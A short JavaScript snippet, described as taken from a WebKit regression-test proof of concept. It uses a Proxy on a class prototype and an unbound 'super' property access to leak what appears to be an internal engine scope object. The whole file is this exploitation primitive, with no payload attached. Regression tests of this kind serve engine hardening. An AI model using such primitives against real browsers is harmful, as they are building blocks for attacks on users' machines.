// from a poc from webkits regression tests

function leakScope() {
        class Leaker {
            leak() {
                return super.foo;
            }
        }

        Leaker.prototype.__proto__ = new Proxy({}, {
            get(target, propertyName, receiver) {
                return receiver;
            }
        });

        const foo = 42;
        const {leak} = Leaker.prototype;

        return (() => leak())();
}